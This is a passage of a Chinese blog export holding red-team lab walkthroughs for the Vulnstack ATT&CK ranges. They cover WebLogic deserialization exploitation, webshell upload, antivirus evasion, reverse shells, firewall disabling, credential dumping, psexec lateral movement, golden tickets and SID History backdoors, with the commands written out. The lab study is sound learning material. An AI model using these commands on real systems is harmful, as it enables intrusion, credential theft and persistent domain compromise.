src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0693a37257e64f9ea776866dd160f4c1.png\"><br>开启监听，成功上线：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//77a62349712941489cec268835f475fd.png\"><br>删除记录：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net use \\\\192.168.93.40\\ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"psexec-域控\"><a href=\"#psexec-域控\" class=\"headerlink\" title=\"psexec-域控\"></a>psexec-域控</h2><p>尝试域控</p>\n<p>Psexec试一下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//93ae7b9b9ffc4f14a69deace9a3b1637.png\"><br>失败，原来是防火墙</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//738791180f0d45ea8d1b68772a3cdd3e.png\"><br>再次尝试建立ipc并用sc命令关闭域控防火墙</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c9fec437c7444e8ab4aa882ea29d12.png\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc \\\\192.168.93.30 create unablefirewall binpath&#x3D; “netsh advfirewall set allprofiles state off &#x2F;&#x2F;创建服务</span><br><span class=\"line\">sc \\\\192.168.93.30 start unablefirewall &#x2F;&#x2F;启动服务</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f1de3b7d8da04b6aa1463f61ce5e4bf3.png\"><br>再打一遍成功上线：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fbba812767464392934d090eec8ae188.png\"><br>这里当然也可以用ipc传马</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xz.aliyun.com/t/9574#toc-6\">Vulnstack内网靶场渗透记录</a></p>\n<p><a href=\"https://www.freebuf.com/articles/network/264560.html\">自主搭建的三层网络域渗透靶场打靶记录</a></p>\n","categories":["渗透"]},{"title":"ATT&CK红队评估实战靶场（二）","url":"/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>第二个靶机来喽，地址：<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/3/\">vulunstack</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163043328.png\"></p>\n<h1 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h1><p>大喊一声我淦！！！！！<br>配个网络配置弄了半天</p>\n<a id=\"more\"></a>\n<h2 id=\"配置信息\"><a href=\"#配置信息\" class=\"headerlink\" title=\"配置信息\"></a>配置信息</h2><blockquote>\n<p>DC<br>IP：10.10.10.10<br>OS：Windows 2012(64)<br>应用：AD域</p>\n</blockquote>\n<blockquote>\n<p>WEB<br>IP1：10.10.10.80<br>IP2：192.168.47.131<br>OS：Windows 2008(64)<br>应用：Weblogic 10.3.6MSSQL 2008</p>\n</blockquote>\n<blockquote>\n<p>PC<br>IP1：10.10.10.201<br>IP2：192.168.47.130<br>OS：Windows 7(32)</p>\n</blockquote>\n<blockquote>\n<p>攻击机<br>IP：192.168.47.128<br>WEB，PC 有360和防火墙</p>\n</blockquote>\n<h2 id=\"网络配置：\"><a href=\"#网络配置：\" class=\"headerlink\" title=\"网络配置：\"></a>网络配置：</h2><ul>\n<li>内网默认网段为10.10.10.1/24<br>DMZ默认网段为 192.168.111.1/24<br>管理员 Administrator  / 1qaz@WSX</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163247464.png\"></p>\n<hr>\n<h2 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h2><p>首先添加一个vm2的内网自定义，设置子网为10.10.10.1/24</p>\n<p>当虚拟机开启时，会采用已经设定过的ip地址(必须符合10.10.10开头)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163318747.png\"></p>\n<p>将DC,PC,WEB 设为 vm2 （内网环境）</p>\n<hr>\n<h2 id=\"外网\"><a href=\"#外网\" class=\"headerlink\" title=\"外网\"></a>外网</h2><p>内网设置好了，外网这样设置</p>\n<p>我设置的外网连接方式为NAT</p>\n<p>将 攻击机，PC，WEB 外网设置为NAT，为了与kali在同一网段</p>\n<p>PC与WEB做修改如下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032816341322.png\"><br>需要管理员权限： Administrator  / 1qaz@WSX</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163428153.png\"><br>选择自动获取ip，自动获取DNS</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163446644.png\"><br>PC :</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163502316.png\"><br>WEB :</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163517553.png\"></p>\n<hr>\n<h2 id=\"开启web服务\"><a href=\"#开启web服务\" class=\"headerlink\" title=\"开启web服务\"></a>开启web服务</h2><p>开启WEB的服务：管理员身份运行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163612230.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163623526.png\"><br>Kali访问如下即配置成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163642358.png\"></p>\n<hr>\n<h1 id=\"突破边界\"><a href=\"#突破边界\" class=\"headerlink\" title=\"突破边界\"></a>突破边界</h1><h2 id=\"端口\"><a href=\"#端口\" class=\"headerlink\" title=\"端口\"></a>端口</h2><p>Nmap 端口：</p>\n<p>发现445 7001 3389 135等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032816383547.png\"></p>\n<p>7001开启 <code>weblogic</code> v10.3.6.0</p>\n<hr>\n<h2 id=\"漏洞扫描\"><a href=\"#漏洞扫描\" class=\"headerlink\" title=\"漏洞扫描\"></a>漏洞扫描</h2><p>AWVS扫描：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163912995.png\"><br>显示存在weblogic漏洞：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163926549.png\"><br>WeblogicScan 扫描：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328163939670.png\"><br>攻击面：</p>\n<ol>\n<li>   后台爆破</li>\n<li>   Java反序列化漏洞<br>CVE-2017-3506 漏洞存在<br>CVE-2019-2725 漏洞存在<br>CVE-2019-2729 漏洞存在</li>\n</ol>\n<hr>\n<h2 id=\"端口攻击\"><a href=\"#端口攻击\" class=\"headerlink\" title=\"端口攻击\"></a>端口攻击</h2><p>1.后台：爆破就算了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032816410517.png\"><br>2.MSF</p>\n<p>1). CVE-2019-2725</p>\n<blockquote>\n<p>exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164159451.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164208550.png\"><br>设置目标为windows：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164219754.png\"><br>失败：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164232980.png\"></p>\n<hr>\n<p>2). MS17_010</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032816434483.png\"><br>失败：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164355695.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164420297.png\"></p>\n<hr>\n<h1 id=\"漏洞webshell\"><a href=\"#漏洞webshell\" class=\"headerlink\" title=\"漏洞webshell\"></a>漏洞webshell</h1><h2 id=\"weblogic漏洞上传木马工具\"><a href=\"#weblogic漏洞上传木马工具\" class=\"headerlink\" title=\"weblogic漏洞上传木马工具\"></a>weblogic漏洞上传木马工具</h2><p>利用java反序列化利用工具上传木马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164502554.png\"><br>Tasklist 查看进程 发现360：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164521628.png\"><br>匹配是什么杀软：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328164540420.png\"></p>\n<hr>\n<h2 id=\"木马获取shell\"><a href=\"#木马获取shell\" class=\"headerlink\" title=\"木马获取shell\"></a>木马获取shell</h2><p>weblogic上传木马路径选择：<a href=\"https://www.shuzhiduo.com/A/gVdnpR2QJW/\">weblogic上传路径</a></p>\n<p>方法1：把shell写到控制台images目录中:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp              &#x2F;&#x2F;目录上传木马</span><br><span class=\"line\"></span><br><span class=\"line\">访问 http:&#x2F;&#x2F;*.*.*.*:7001&#x2F;console&#x2F;framework&#x2F;skins&#x2F;wlsconsole&#x2F;images&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p>方法2：写到uddiexplorer目录中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\uddiexplorer\\随机字符\\war\\shell.jsp   &#x2F;&#x2F;目录写入木马，</span><br><span class=\"line\"></span><br><span class=\"line\">访问 http:&#x2F;&#x2F;*.*.*.*:7001&#x2F;uddiexplorer&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p>方法3：在应用安装目录中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\Oracle\\Middleware\\user_projects\\domains\\application\\servers\\AdminServer\\tmp\\_WL_user\\项目名\\随机字符\\war\\shell.jsp   &#x2F;&#x2F;目录写入木马，</span><br><span class=\"line\"></span><br><span class=\"line\">访问 http:&#x2F;&#x2F;*.*.*.*:7001&#x2F;项目名&#x2F;shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p>这里选择第一种</p>\n<h3 id=\"冰蝎\"><a href=\"#冰蝎\" class=\"headerlink\" title=\"冰蝎\"></a>冰蝎</h3><p>上传冰蝎的jsp马</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165358765.png\"><br>成功连接：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165409491.png\"><br>systeminfo查看一下 主机信息，补丁等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165439727.png\"><br>反弹shell ：</p>\n<p>根据提示操作即可</p>\n<p>msf set payload java/meterpreter/reverse_tcp</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165509794.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165625992.png\"></p>\n<hr>\n<h3 id=\"MSF马\"><a href=\"#MSF马\" class=\"headerlink\" title=\"MSF马\"></a>MSF马</h3><p>想用msf的马反弹给msf失败：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165656348.png\"><br>进行免杀：<br><a href=\"http://aiyuanzhen.com/index.php/archives/256/\">bamcompile免杀</a></p>\n<p>生成php后门：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165827322.png\"><br>免杀以下转成exe文件：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165850896.png\"><br>监听上线  Php/meterpreter:  感觉不好用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328165916522.png\"></p>\n<hr>\n<h3 id=\"cs马\"><a href=\"#cs马\" class=\"headerlink\" title=\"cs马\"></a>cs马</h3><p>第一次使用cobalt strike：</p>\n<p>设置监听：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170010889.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170018434.png\"><br>冰蝎上传木马：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170035883.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170045608.png\"></p>\n<hr>\n<h3 id=\"Godzilla-哥斯拉\"><a href=\"#Godzilla-哥斯拉\" class=\"headerlink\" title=\"Godzilla(哥斯拉)\"></a>Godzilla(哥斯拉)</h3><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170129681.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170138415.png\"><br>反弹shell： jmeterpreter</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170200803.png\"></p>\n<hr>\n<h3 id=\"weblogic-CVE-EXP\"><a href=\"#weblogic-CVE-EXP\" class=\"headerlink\" title=\"weblogic CVE EXP\"></a>weblogic CVE EXP</h3><p><a href=\"https://github.com/TopScrew/CVE-2019-2725\">利用攻击脚本</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170257476.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170303659.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170311584.png\"><br>感觉以上的meterpreter都不好使</p>\n<hr>\n<h3 id=\"windows后门免杀处理\"><a href=\"#windows后门免杀处理\" class=\"headerlink\" title=\"windows后门免杀处理\"></a>windows后门免杀处理</h3><p>去exploit-db下载对应cve-2019-2725 exp</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170357767.png\"><br>生成一个powershell的木马：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170412400.png\"><br>然后进行免杀：Invoke-Obfuscation</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170459139.png\"><br>注：我免杀之后字符太长了，以至于后面运行时出错，在经过免杀后应该是能bypass360的，所以后面把靶机的360暂时关了，成功获取权限，至于免杀，会再学习的</p>\n<p>将exploit的内容替换为木马的内容：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032817055385.png\"><br>设置监听：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170605768.png\"><br>运行exploit：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170624854.png\"><br>没反应：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170639743.png\"><br>原来是设置payload的问题，改为这样：去掉 x64</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170712803.png\"><br>获得meterpreter：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170754283.png\"><br>顺便关掉防火墙：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170818189.png\"><br>这里我有个疑问，就是meterpreter的类型不同会对操作有什么影响，比如以上的 phpmeterpreter，javameterpreter，windowsmeterpreter ?</p>\n<hr>\n<h1 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h1><h2 id=\"msf派生cs-shell\"><a href=\"#msf派生cs-shell\" class=\"headerlink\" title=\"msf派生cs shell\"></a>msf派生cs shell</h2><p>Msf命令注入设置为cs所监听的也就是本机：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328170958168.png\"><br>Cs设置监听后上线：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171014104.png\"></p>\n<hr>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><h3 id=\"凭证收集\"><a href=\"#凭证收集\" class=\"headerlink\" title=\"凭证收集\"></a>凭证收集</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashdump</span><br><span class=\"line\">logonpasswords</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171121563.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032817113188.png\"></p>\n<hr>\n<h3 id=\"域内信息\"><a href=\"#域内信息\" class=\"headerlink\" title=\"域内信息\"></a>域内信息</h3><p>1). 本机信息收集</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Systeminfo  &#x2F;&#x2F;查看操作系统信息</span><br><span class=\"line\">Ipconfig &#x2F;all   &#x2F;&#x2F;查询本机ip段，所在域等</span><br><span class=\"line\">Whoami   &#x2F;&#x2F;查看当前用户权限</span><br><span class=\"line\">Net user\t&#x2F;&#x2F;查看本地用户</span><br><span class=\"line\">Net localgroup administrators\t&#x2F;&#x2F;查看本地管理员组(通常 包含域用户)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171250920.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171338704.png\"><br>得知web服务器为Windows server 2008 有两个网段</p>\n<p>2). 域内信息收集</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net config workstation     &#x2F;&#x2F; 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等</span><br><span class=\"line\">net view &#x2F;domain              &#x2F;&#x2F; 查看域</span><br><span class=\"line\">net time &#x2F;domain           &#x2F;&#x2F; 主域服务器会同时作为时间服务器</span><br><span class=\"line\">net user &#x2F;domain      &#x2F;&#x2F; 查看域用户</span><br><span class=\"line\">net group &#x2F;domain     &#x2F;&#x2F; 查看域内用户组列表</span><br><span class=\"line\">net group &quot;domain computers&quot; &#x2F;domain      &#x2F;&#x2F; 查看域内的机器</span><br><span class=\"line\">net group &quot;domain controllers&quot; &#x2F;domain          &#x2F;&#x2F; 查看域控制器组</span><br><span class=\"line\">net group &quot;Enterprise Admins&quot; &#x2F;domain    &#x2F;&#x2F; 查看域管理员组</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171442369.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171448634.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171454574.png\"><br>域名为de1ay.com 存在两台域主机web和pc 域控为DCde1ay.com主机名为DC，域管理员为Administrator</p>\n<hr>\n<h1 id=\"横向移动\"><a href=\"#横向移动\" class=\"headerlink\" title=\"横向移动\"></a>横向移动</h1><h2 id=\"路由代理\"><a href=\"#路由代理\" class=\"headerlink\" title=\"路由代理\"></a>路由代理</h2><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171534588.png\"></p>\n<hr>\n<h2 id=\"内网扫描\"><a href=\"#内网扫描\" class=\"headerlink\" title=\"内网扫描\"></a>内网扫描</h2><p>arp扫描网段：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run post&#x2F;windows&#x2F;gather&#x2F;arp_scanner RHOSTS&#x3D;10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171628597.png\"><br>扫描存活主机：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171651987.png\"><br>这就奇怪了明明有10.10.10.201但是存活主机没有，后来知道是 PC 防火墙开启的原因</p>\n<hr>\n<h2 id=\"版本扫描\"><a href=\"#版本扫描\" class=\"headerlink\" title=\"版本扫描\"></a>版本扫描</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>\n\n<p>dc为 windows2012</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171812715.png\"><br>Pc为win7：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171823448.png\"></p>\n<hr>\n<h1 id=\"尝试攻击\"><a href=\"#尝试攻击\" class=\"headerlink\" title=\"尝试攻击\"></a>尝试攻击</h1><h2 id=\"永恒之蓝\"><a href=\"#永恒之蓝\" class=\"headerlink\" title=\"永恒之蓝\"></a>永恒之蓝</h2><p>DC直接蓝屏</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328171931339.png\"></p>\n<hr>\n<h2 id=\"psexec\"><a href=\"#psexec\" class=\"headerlink\" title=\"psexec\"></a>psexec</h2><p>可用cs的，也可用msf的</p>\n<h3 id=\"CS\"><a href=\"#CS\" class=\"headerlink\" title=\"CS\"></a>CS</h3><p>对目标网段进行端口存活探测，因为是psexec传递登录<br>仅需探测445端口</p>\n<p>得到10.10.10.201和10.10.10.10 :</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328172036454.png\"><br>新建监听：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2021032817210443.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328172122364.png\"><br>用获取过的密码登录：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328172142603.png\"><br>上线：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328172202209.png\"><br>PC 一直上不去：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328172225156.png\"></p>\n<hr>\n<h3 id=\"MSF\"><a href=\"#MSF\" class=\"headerlink\" title=\"MSF\"></a>MSF</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class=\"line\">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class=\"line\">set smbuser administrator</span><br><span class=\"line\">set smbpass 1qaz@WSX</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328172310504.png\"><br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328172324587.png\"><br>域控算是拿下</p>\n<hr>\n<h2 id=\"IPC\"><a href=\"#IPC\" class=\"headerlink\" title=\"IPC$\"></a>IPC$</h2><p>这个与第一个靶机最后共享c盘一样</p>\n<h2 id=\"关于PC\"><a href=\"#关于PC\" class=\"headerlink\" title=\"关于PC\"></a>关于PC</h2><p>Pc一直出现问题，存在工作站与域之间不信任关系，然后我退域进域一直没有解决问题，所以就放弃pc了</p>\n<hr>\n<h1 id=\"域控权限维持\"><a href=\"#域控权限维持\" class=\"headerlink\" title=\"域控权限维持\"></a>域控权限维持</h1><p>以下方法借鉴参考中的公众号</p>\n<h2 id=\"Golden-Ticket-黄金票据\"><a href=\"#Golden-Ticket-黄金票据\" class=\"headerlink\" title=\"Golden Ticket(黄金票据)\"></a>Golden Ticket(黄金票据)</h2><blockquote>\n<p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，即使日后当域控权限掉了，也可以再通过域内其他任意机器伪造票据重新获取最高权限。</p>\n</blockquote>\n<p>黄金票据的前提：</p>\n<p>1.域名称<br>2.域的SID值<br>3.域的KRBTGT账户NTLM密码哈希<br>4.伪造用户名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328173728628.png\"><br>在域控获得<code>KRBTGT账户NTLM密码哈希和SID</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328173820995.png\" alt=\"在这里插入图片描述\"></p>\n<blockquote>\n<p>SID: S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415<br>KRBTGT: 82dfc71b72a11ef37d663047bc2088fb</p>\n</blockquote>\n<p>填上对应参数 :</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328173853685.png\"></p>\n<p>票据伪造成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328173921889.png\"><br>执行命令：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328173951464.png\"></p>\n<hr>\n<h2 id=\"SID-History域后门\"><a href=\"#SID-History域后门\" class=\"headerlink\" title=\"SID History域后门\"></a>SID History域后门</h2><p>在Windows中，每个用户都有自己的SID。SID的作用主要是跟踪安全主体控制用户连接资源时的访问权限。</p>\n<blockquote>\n<p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。</p>\n</blockquote>\n<p>首先我们在域控制器上新建一个恶意用户“whoami”：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user whoami Liu78963 &#x2F;add</span><br></pre></td></tr></table></figure>\n\n<p>然后像之前一样用shellcode_inject启动mimikatz，然后执行如下命令，<code>将域管理员Administrator的SID添加到恶意域用户 whoami 的SID History属性中</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sid::patch</span><br><span class=\"line\">sid::add &#x2F;sam:whoami &#x2F;new:Administrator   &#x2F;&#x2F;将Administrator的SID添加到whoami的SID History属性中</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328174752670.png\"></p>\n<p>注意：在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。</p>\n<p>然后，我们可以用powershell查看一下这个whoami恶意用户的SID History：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">load powershell</span><br><span class=\"line\">powershell_shell</span><br><span class=\"line\">Import-Module activedirectory</span><br><span class=\"line\">Get-ADUser whoami -Properties sidhistory</span><br><span class=\"line\">Get-ADUser administrator -Properties sidhistory</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//20210328174806551.png\"><br>如上图所示，whoami用户的SID 